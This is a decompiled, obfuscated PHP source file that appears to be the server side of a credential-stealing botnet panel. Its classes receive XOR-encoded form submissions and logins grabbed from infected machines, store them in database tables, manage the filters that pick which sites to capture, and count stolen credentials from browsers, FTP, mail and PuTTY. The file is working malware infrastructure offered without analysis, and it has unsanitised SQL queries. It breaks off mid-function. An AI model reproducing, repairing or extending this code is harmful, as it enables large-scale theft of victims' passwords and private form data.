<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

if (!defined("IN_CORE_INC")) {
    exit("..");
}
class CFormGrab extends CSqlWrap
{
    public function GetCountAndFreeResult($query_res)
    {
        $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_ = 0;
        if ($query_res) {
            list($_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_) = @mysql_fetch_row($query_res);
            @mysql_free_result($query_res);
        }
        return $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_;
    }
    public function Stats_GetTotalForms()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_forms");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalSpecialForms()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_forms WHERE INSTR(REPLACE(post_headers, '");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalForms_24h()
    {
        $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ = time() - 84600;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_forms WHERE capture_date > '" . $_obfuscated_0D1B070E0D280232311E2B093239321018290724120E22_ . "'");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalForms_3d()
    {
        $_obfuscated_0D2F401E37092E2830022B180F2D40021F3B0E39312E22_ = time() - 84600 * 3;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_forms WHERE capture_date > '" . $_obfuscated_0D2F401E37092E2830022B180F2D40021F3B0E39312E22_ . "'");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalForms_7d()
    {
        $_obfuscated_0D2F401E37092E2830022B180F2D40021F3B0E39312E22_ = time() - 84600 * 7;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_forms WHERE capture_date > '" . $_obfuscated_0D2F401E37092E2830022B180F2D40021F3B0E39312E22_ . "'");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalFilters()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_form_filters");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetChromeGrabCount()
    {
        $_obfuscated_0D2C303D23240D5C2A071D5B28031B1E3B040B05180E01_ = "chrome";
        $_obfuscated_0D013C35350C0910320D385B141C213F323D10233C3B22_ = parent::Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".grabbed_forms WHERE REPLACE(host_process_path, '" . $_obfuscated_0D2C303D23240D5C2A071D5B28031B1E3B040B05180E01_ . "%'");
        $_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_ = 0;
        if ($_obfuscated_0D013C35350C0910320D385B141C213F323D10233C3B22_) {
            list($_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_) = mysql_fetch_row($_obfuscated_0D013C35350C0910320D385B141C213F323D10233C3B22_);
            mysql_free_result($_obfuscated_0D013C35350C0910320D385B141C213F323D10233C3B22_);
        }
        return $_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_;
    }
    public function Stats_GetFirefoxGrabCount()
    {
        $_obfuscated_0D1103132D1A133E3F2B012A091B2D3719341604263732_ = "firefox";
        $_obfuscated_0D3F262627122203020411212C285B021136050E3E2111_ = parent::Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".grabbed_forms WHERE REPLACE(host_process_path, '" . $_obfuscated_0D1103132D1A133E3F2B012A091B2D3719341604263732_ . "%'");
        $_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_ = 0;
        if ($_obfuscated_0D3F262627122203020411212C285B021136050E3E2111_) {
            list($_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_) = mysql_fetch_row($_obfuscated_0D3F262627122203020411212C285B021136050E3E2111_);
            mysql_free_result($_obfuscated_0D3F262627122203020411212C285B021136050E3E2111_);
        }
        return $_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_;
    }
    public function Stats_GetInternetExplorerGrabCount()
    {
        $_obfuscated_0D031E343F5C192D0A3D1D0323013F183E0E3D29311B01_ = "iexplore";
        $_obfuscated_0D3E10362F0E5B05013025021F0D3B5C162D0A36010932_ = parent::Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".grabbed_forms WHERE REPLACE(host_process_path, '" . $_obfuscated_0D031E343F5C192D0A3D1D0323013F183E0E3D29311B01_ . "%'");
        $_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_ = 0;
        if ($_obfuscated_0D3E10362F0E5B05013025021F0D3B5C162D0A36010932_) {
            list($_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_) = mysql_fetch_row($_obfuscated_0D3E10362F0E5B05013025021F0D3B5C162D0A36010932_);
            mysql_free_result($_obfuscated_0D3E10362F0E5B05013025021F0D3B5C162D0A36010932_);
        }
        return $_obfuscated_0D402F0612021E1E0F3C401F26050A212B0E240F160701_;
    }
    public function Stats_GetTotalCapturesByFilter($filter_mask)
    {
        if (strlen($filter_mask) === 0) {
            return NULL;
        }
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = NULL;
        $_obfuscated_0D37030D0D105C1C5C0B2F22311D27111C1D0530145B11_ = 0;
        $filter_mask = str_replace("*", "", $filter_mask);
        $filter_mask = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($filter_mask);
        $_obfuscated_0D2B32290110402725083216332E171503331E3E290532_ = (int) strlen($filter_mask);
        $_obfuscated_0D14083C132F283036043027383103362310372C130B11_ = "host";
        if (strpos($filter_mask, "content:") === 0) {
            $_obfuscated_0D272827313E310E34152808263E2D010B171427022F11_ = strlen("content:");
            $filter_mask = substr($filter_mask, $_obfuscated_0D272827313E310E34152808263E2D010B171427022F11_, strlen($filter_mask) - $_obfuscated_0D272827313E310E34152808263E2D010B171427022F11_);
            $_obfuscated_0D14083C132F283036043027383103362310372C130B11_ = "post_data";
        }
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_forms WHERE INSTR(LOWER(REPLACE(" . $_obfuscated_0D14083C132F283036043027383103362310372C130B11_ . ", '" . $filter_mask . "'))")) {
            list($_obfuscated_0D37030D0D105C1C5C0B2F22311D27111C1D0530145B11_) = @mysql_fetch_row($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
            @mysql_free_result($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
        }
        return (int) $_obfuscated_0D37030D0D105C1C5C0B2F22311D27111C1D0530145B11_;
    }
    public function Stats_GetTotalCapturesByClientGUID($bot_guid)
    {
        if (strlen($bot_guid) === 0) {
            return NULL;
        }
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = NULL;
        $_obfuscated_0D22093D1A3E333F0B3B190B1B055C225B29331C351232_ = 0;
        if ($_obfuscated_0D22093D1A3E333F0B3B190B1B055C225B29331C351232_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_forms WHERE bot_guid = UNHEX('" . $bot_guid . "')")) {
            list($_obfuscated_0D22093D1A3E333F0B3B190B1B055C225B29331C351232_) = @mysql_fetch_row($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
            @mysql_free_result($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
        }
        return (int) $_obfuscated_0D22093D1A3E333F0B3B190B1B055C225B29331C351232_;
    }
    public function AddFilter($filter_options = 0, $filter_mask = "")
    {
        global $mCache;
        if (strlen($filter_mask) === 0) {
            return NULL;
        }
        $filter_mask = @bin2hex($filter_mask);
        $filter_options = (int) $filter_options;
        $_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_ = parent::Query("INSERT INTO " . $this->pdbname . ".grabbed_form_filters VALUES(NULL, '" . $filter_options . "', UNHEX('" . $filter_mask . "'))");
        if ($_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_) {
            $mCache->Set(CACHE_CONFIG_URL_TRACK_LIST, "");
        }
        return $_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_;
    }
    public function DeleteFilter($filter_id = 0)
    {
        global $mCache;
        $filter_id = (int) $filter_id;
        $_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_ = parent::Query("DELETE FROM " . $this->pdbname . ".grabbed_form_filters WHERE id = '" . $filter_id . "'");
        if ($_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_ && 1 <= mysql_affected_rows()) {
            $mCache->Set(CACHE_CONFIG_URL_TRACK_LIST, "");
        }
        return $_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_;
    }
    public function FilterExists($filter_mask = "")
    {
        if (strlen($filter_mask) == 0) {
            return false;
        }
        $filter_mask = @bin2hex($filter_mask);
        $_obfuscated_0D010C38141D0D141F340F1B3C0D0D5B3D1E0A09103511_ = parent::Query("SELECT id FROM " . $this->pdbname . ".grabbed_form_filters WHERE filter_mask = UNHEX('" . $filter_mask . "')");
        return $_obfuscated_0D010C38141D0D141F340F1B3C0D0D5B3D1E0A09103511_ && 0 < @mysql_num_rows($_obfuscated_0D010C38141D0D141F340F1B3C0D0D5B3D1E0A09103511_) ? true : false;
    }
    public function GetFilterCount()
    {
        $_obfuscated_0D15405C380115081C075C343637380E16152D25393E32_ = 0;
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_form_filters")) {
            list($_obfuscated_0D15405C380115081C075C343637380E16152D25393E32_) = @mysql_fetch_row($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
            @mysql_free_result($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
        }
        return $_obfuscated_0D15405C380115081C075C343637380E16152D25393E32_;
    }
    public function AddFormCapture($bot_guid, $bot_id, $capture_host, $capture_post_data, $capture_post_header_data, $capture_process_path, $bot_localtime, $bot_os, $bot_ip, $bot_group)
    {
        if (strlen($capture_host) < 4 || strlen($capture_post_data) < 3 || strlen($capture_process_path) < 4) {
            return NULL;
        }
        $_obfuscated_0D091A3537300E21380D5C295C010532300A360C1C2232_ = @strlen($capture_post_header_data);
        $bot_id = (int) $bot_id;
        $bot_guid = @bin2hex($bot_guid);
        $capture_host = @bin2hex($capture_host);
        $capture_post_data = @bin2hex($capture_post_data);
        if ($_obfuscated_0D091A3537300E21380D5C295C010532300A360C1C2232_) {
            $capture_post_header_data = @bin2hex($capture_post_header_data);
        }
        $capture_process_path = @bin2hex($capture_process_path);
        $bot_os = (int) $bot_os;
        $_obfuscated_0D043B2C241C0C031A5C2D332834262F240D2C17113F32_ = sprintf("%u", $bot_ip);
        $bot_localtime = (int) $bot_localtime;
        if ($bot_group == "") {
            $bot_group = "default";
        }
        $bot_group = @bin2hex($bot_group);
        $_obfuscated_0D2E5C3502182F251B09095B1E15110205012334210A32_ = "";
        if ($_obfuscated_0D091A3537300E21380D5C295C010532300A360C1C2232_) {
            $_obfuscated_0D2E5C3502182F251B09095B1E15110205012334210A32_ = "UNHEX('" . $capture_post_header_data . "')";
        } else {
            $_obfuscated_0D2E5C3502182F251B09095B1E15110205012334210A32_ = "''";
        }
        $_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_ = parent::Query("INSERT INTO " . $this->pdbname . ".grabbed_forms VALUES(NULL, UNHEX('" . $bot_guid . "'), '" . $bot_id . "', UNHEX('" . $capture_host . "'), UNHEX('" . $capture_post_data . "'), " . $_obfuscated_0D2E5C3502182F251B09095B1E15110205012334210A32_ . ", UNHEX('" . $capture_process_path . "'), UNIX_TIMESTAMP(NOW()), '" . $bot_os . "', '" . $bot_localtime . "', '" . $_obfuscated_0D043B2C241C0C031A5C2D332834262F240D2C17113F32_ . "', UNHEX('" . $bot_group . "'))");
        return $_obfuscated_0D04230A1408072C114002393E290C170C230C395C1032_;
    }
    public function ParseAndAddGrabbedFormData($botClientObjectEx, $bot_guid_bin = "", $bot_record_id = 0)
    {
        global $g_szPost_FormInfoHostName;
        global $g_szPost_FormInfoContentName;
        global $g_szPost_FormInfoProcessName;
        global $g_szPost_FormInfoHeadersName;
        if (isset($_POST[(string) $g_szPost_FormInfoHostName]) && isset($_POST[(string) $g_szPost_FormInfoContentName]) && isset($_POST[(string) $g_szPost_FormInfoProcessName])) {
            $_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_ = $_POST[(string) $g_szPost_FormInfoHostName];
            $_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_ = $_POST[(string) $g_szPost_FormInfoContentName];
            $_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_ = "";
            $_obfuscated_0D34195B0F012F073D3D2121083F06260C2B080A062E22_ = 0;
            if (isset($_POST[(string) $g_szPost_FormInfoHeadersName])) {
                $_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_ = $_POST[(string) $g_szPost_FormInfoHeadersName];
            }
            $_obfuscated_0D380C5C0736382F301F09162A0F23383F1834061A2232_ = $_POST[(string) $g_szPost_FormInfoProcessName];
            $_obfuscated_0D3207325C2B271B2F262B0826210E1E2710350E401632_ = @strlen($_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_);
            $_obfuscated_0D091A1215211F0F381E5B0F12233807090D2A1B081522_ = @strlen($_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_);
            $_obfuscated_0D34195B0F012F073D3D2121083F06260C2B080A062E22_ = @strlen($_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_);
            $_obfuscated_0D281C19130833290D070A3F351708061B5C0A385C1D11_ = @strlen($_obfuscated_0D380C5C0736382F301F09162A0F23383F1834061A2232_);
            if (4 < $_obfuscated_0D3207325C2B271B2F262B0826210E1E2710350E401632_ && 2 < $_obfuscated_0D091A1215211F0F381E5B0F12233807090D2A1B081522_ && 9 < $_obfuscated_0D281C19130833290D070A3F351708061B5C0A385C1D11_) {
                global $g_btPost_FormXorKeys;
                $_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_ = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_);
                $_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_ = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_);
                if ($_obfuscated_0D34195B0F012F073D3D2121083F06260C2B080A062E22_) {
                    $_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_ = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_);
                }
                $_obfuscated_0D380C5C0736382F301F09162A0F23383F1834061A2232_ = _obfuscated_0D191C1C313423341903060A182E03320F3E2D063C0532_($_obfuscated_0D380C5C0736382F301F09162A0F23383F1834061A2232_);
                $_obfuscated_0D083117131532262938251814341D113B2B320C273732_ = $g_btPost_FormXorKeys;
                $_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_, $_obfuscated_0D083117131532262938251814341D113B2B320C273732_);
                $_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_, $_obfuscated_0D083117131532262938251814341D113B2B320C273732_);
                if ($_obfuscated_0D34195B0F012F073D3D2121083F06260C2B080A062E22_) {
                    $_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_, $_obfuscated_0D083117131532262938251814341D113B2B320C273732_);
                }
                $_obfuscated_0D380C5C0736382F301F09162A0F23383F1834061A2232_ = _obfuscated_0D16390D053330180D2E2B1117353B1E1C331E5B0F1532_($_obfuscated_0D380C5C0736382F301F09162A0F23383F1834061A2232_, $_obfuscated_0D083117131532262938251814341D113B2B320C273732_);
                $_obfuscated_0D2A191E192C1D212B3604353C2A12065C141426033711_ = str_replace("\r", "", $_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_);
                $_obfuscated_0D2A191E192C1D212B3604353C2A12065C141426033711_ = str_replace("\n", "", $_obfuscated_0D2A191E192C1D212B3604353C2A12065C141426033711_);
                $_obfuscated_0D2A191E192C1D212B3604353C2A12065C141426033711_ = str_replace(" ", "", $_obfuscated_0D2A191E192C1D212B3604353C2A12065C141426033711_);
                if (65535 <= strlen($_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_)) {
                    $_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_ = substr($_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_, 0, 65534);
                }
                if (65535 <= strlen($_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_)) {
                    $_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_ = substr($_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_, 0, 65534);
                }
                if (2 < strlen($_obfuscated_0D2A191E192C1D212B3604353C2A12065C141426033711_)) {
                    $this->AddFormCapture($bot_guid_bin, $bot_record_id, $_obfuscated_0D0D1B1F3B0422125B03121D3D3934302A122439061411_, $_obfuscated_0D21141F2F3C3F3E25192A2C3C2A1E171D21285B252332_, $_obfuscated_0D3D023C2B3C0D040C1D0316310D0A30294017181B4011_, $_obfuscated_0D380C5C0736382F301F09162A0F23383F1834061A2232_, $botClientObjectEx->Bot_Time_Current, $botClientObjectEx->Bot_OS, ip2long($_SERVER["REMOTE_ADDR"]), $botClientObjectEx->GroupName);
                }
            }
        }
    }
    public function GetGrabFiltersAsBlob()
    {
        $_obfuscated_0D0C5B10255B07400F1139360406283426121F2A173511_ = parent::Query("SELECT options, filter_mask FROM " . $this->pdbname . ".grabbed_form_filters LIMIT 1024");
        $_obfuscated_0D012A5B0B341E0228260C3B351E2F2F38070316030422_ = "";
        if ($_obfuscated_0D0C5B10255B07400F1139360406283426121F2A173511_ && 0 < (int) @mysql_num_rows($_obfuscated_0D0C5B10255B07400F1139360406283426121F2A173511_)) {
            while ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_ = @mysql_fetch_assoc($_obfuscated_0D0C5B10255B07400F1139360406283426121F2A173511_)) {
                if (isset($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["filter_mask"]) && strlen($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["filter_mask"]) && !((int) $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["options"] & FILTER_OPTIONS_STATE_DISABLED)) {
                    $_obfuscated_0D012A5B0B341E0228260C3B351E2F2F38070316030422_ .= $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["filter_mask"] . "\n";
                }
            }
            @mysql_free_result($_obfuscated_0D0C5B10255B07400F1139360406283426121F2A173511_);
        }
        return $_obfuscated_0D012A5B0B341E0228260C3B351E2F2F38070316030422_;
    }
}
class CGrab extends CSqlWrap
{
    public function GetCountAndFreeResult($query_res = NULL)
    {
        $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_ = 0;
        if ($query_res) {
            list($_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_) = @mysql_fetch_row($query_res);
            @mysql_free_result($query_res);
        }
        return $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_;
    }
    public function Stats_GetTotalLoginsByClientGUID($bot_guid)
    {
        if (strlen($bot_guid) === 0) {
            return NULL;
        }
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_logins WHERE bot_guid = UNHEX('" . $bot_guid . "')");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalLogins()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_logins");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalBrowserLogins()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_logins WHERE login_type = " . GRAB_LOGIN_TYPE_INTERNET_EXPLORER . " OR login_type = " . GRAB_LOGIN_TYPE_FIREFOX . " OR login_type = " . GRAB_LOGIN_TYPE_CHROME);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalFtpClientLogins()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_logins WHERE login_type < " . GRAB_LOGIN_TYPE_FTP_MAX_TYPE_VALUE . " AND login_type > " . GRAB_LOGIN_TYPE_FTP_MIN_TYPE_VALUE);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalFtpNetworkCaptures()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_logins WHERE login_type = " . GRAB_LOGIN_TYPE_FTP_NETWORK_CAPTURE . " OR login_type = " . GRAB_LOGIN_TYPE_FTP_NETWORK_CAPTURE_SSL);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalPuttyLoginCaptures()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_logins WHERE login_type = " . GRAB_LOGIN_TYPE_PUTTY_CAPTURE);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function Stats_GetTotalPOP3LoginCaptures()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".grabbed_logins WHERE login_type = " . GRAB_LOGIN_TYPE_POP3 . " OR login_type = " . GRAB_LOGIN_TYPE_POP3_SSL);
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function TypeStringToDisplayName($login_id_string)
    {
        $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "";
        $_obfuscated_0D2D3901240B281733403B0D28382E381C3F2B2E333E32_ = "";
        $_obfuscated_0D372A3606093112131F221A3B11211B082C2F1D5B2401_ = "";
        $_obfuscated_0D285C2C2F0A1421071F2837022505341F381D053B2711_ = NULL;
        $login_id_string = trim($login_id_string);
        if (strlen($login_id_string) < 3) {
            return "Unknown";
        }
        if (strstr($login_id_string, "/")) {
            $_obfuscated_0D285C2C2F0A1421071F2837022505341F381D053B2711_ = explode("/", $login_id_string);
            if ($_obfuscated_0D285C2C2F0A1421071F2837022505341F381D053B2711_ && 2 <= count($_obfuscated_0D285C2C2F0A1421071F2837022505341F381D053B2711_)) {
                $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = trim($_obfuscated_0D285C2C2F0A1421071F2837022505341F381D053B2711_[0]);
                $_obfuscated_0D2D3901240B281733403B0D28382E381C3F2B2E333E32_ = trim($_obfuscated_0D285C2C2F0A1421071F2837022505341F381D053B2711_[1]);
                if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "FTP") === 0) {
                    $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "FTP Client";
                } else {
                    if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "FTPI") === 0) {
                        $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "FTP Network Intercept";
                    } else {
                        if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "FTPISSL") === 0) {
                            $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "FTP Network Intercept (SSL)";
                        } else {
                            if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "MAIL") === 0) {
                                $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "Mail Client";
                            } else {
                                if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "MAILI") === 0) {
                                    $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "POP3 Email Intercept";
                                } else {
                                    if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "MAILISSL") === 0) {
                                        $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "POP3 Email Intercept (SSL)";
                                    } else {
                                        if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "MSGNR") === 0) {
                                            $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "Messenger Client";
                                        } else {
                                            if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "BROWSER") === 0) {
                                                $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "Browser";
                                            } else {
                                                if (strcasecmp($_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_, "OTHER") === 0) {
                                                    $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "Other";
                                                } else {
                                                    $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ = "Unknown";
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                if (0 < strlen($_obfuscated_0D2D3901240B281733403B0D28382E381C3F2B2E333E32_)) {
                    $_obfuscated_0D372A3606093112131F221A3B11211B082C2F1D5B2401_ = (string) $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_ . " / " . $_obfuscated_0D2D3901240B281733403B0D28382E381C3F2B2E333E32_;
                } else {
                    $_obfuscated_0D372A3606093112131F221A3B11211B082C2F1D5B2401_ = (string) $_obfuscated_0D2A2C3B24251A2C5C1F1B2838030D051E5B0B39390732_;
                }
            }
        } else {
            if (stripos($login_id_string, "putty") === 0) {
                $_obfuscated_0D372A3606093112131F221A3B11211B082C2F1D5B2401_ = "PuTTY SSH Client";
            } else {
                $_obfuscated_0D372A3606093112131F221A3B11211B082C2F1D5B2401_ = "Unknown";
            }
        }
        return $_obfuscated_0D372A3606093112131F221A3B11211B082C2F1D5B2401_;
    }
    public function HashLogin($login_host, $login_username, $login_password)
    {
        $_obfuscated_0D121C082601141F111D3B37132E19222C0F14340D0122_ = "";
        if (@strlen($login_host) < 5) {
            $_obfuscated_0D121C082601141F111D3B37132E19222C0F14340D0122_ = @substr($login_host, 0, 5);
        } else {
            $_obfuscated_0D121C082601141F111D3B37132E19222C0F14340D0122_ = @substr($login_host, 0, 1);
        }
        return @sha1(@strtolower($_obfuscated_0D121C082601141F111D3B37132E19222C0F14340D0122_) . @strtolower($login_username) . @strtolower($login_password));
    }
    public function AddLogin($bot_guid, $bot_id, $login_type, $login_host, $login_port, $login_username, $login_password)
    {
        if (strlen($login_username) == 0 || strlen($login_host) < 2 || (int) $login_port == 0 || 65535 < (int) $login_port) {
            return NULL;
        }
        $bot_guid = @bin2hex($bot_guid);
        $_obfuscated_0D0F23151705110D041637275C181B1C1A1B2D0A0F2701_ = $this->HashLogin($login_host, $login_username, $login_password);
        $bot_id = (int) $bot_id;
